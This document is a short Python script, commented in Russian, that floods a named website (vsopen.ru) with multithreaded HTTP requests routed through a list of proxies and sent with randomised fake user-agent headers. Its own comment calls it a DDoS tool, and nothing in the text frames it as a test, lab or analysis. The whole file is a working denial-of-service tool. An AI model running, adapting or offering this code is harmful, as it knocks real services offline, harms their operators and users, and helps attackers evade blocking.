import requests  # pip install requests
import threading
import fake_useragent  # pip install fake_useragent

from colorama import init, Fore, Back, Style

while 1: 
	try: 
		threads_count = int(input('Потоки: '))
		break
	except: pass


proxy_dict = {'http' : '0.0.0.0'}
init(convert=True)

info = Fore.BLUE + 'INFO' + Fore.WHITE
f = open('proxy.txt', 'r').readlines()
def ddos():  # Дудосит
	for i in range(20):  # 20 проходов по proxy.txt
		# Создаём фэйк хедер 
		user = fake_useragent.UserAgent().random
		header = {'user-agent': user}
		for proxy in f:
			
			proxy_dict['http'] = 'http://'+proxy

			try: 
				request = requests.get('http://www.vsopen.ru/', proxies = proxy_dict, headers = header, timeout = 4)
				print(f'[{info}] {Fore.GREEN + proxy + Fore.WHITE}\n')
			except: print(f'[{info}] {Fore.RED + proxy + Fore.WHITE}\n')


# Запускаем потоки
threads = []
for i in range(threads_count):
	t = threading.Thread(target=ddos, args=())
	threads.append(t)
	t.start()
	print(f'Поток {i}/{threads_count} запущен')
